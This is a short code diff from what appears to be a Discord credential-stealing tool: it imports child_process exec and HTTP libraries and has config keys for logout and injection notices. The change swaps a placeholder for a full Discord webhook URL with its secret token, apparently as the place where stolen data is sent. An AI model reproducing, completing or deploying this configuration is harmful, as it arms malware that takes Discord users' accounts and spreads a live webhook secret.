@@ -13,7 +13,7 @@ const https = require('https');
 const { exec } = require('child_process');
 const axios = require('axios');
 const buf_replace = require('buffer-replace');
-const webhook = "da_webhook"
+const webhook = "https://discord.com/api/webhooks/861281970238390293/gUJzFIfg0WvoX_lDwFRft1k6jXiQj6hKw92J9aAjgrse4iWVnkhJZpyRKxIRJiVTwhAj"
 const config = {
     "logout": "%LOGOUT%1",
     "inject-notify": "%INJECTNOTI%1",
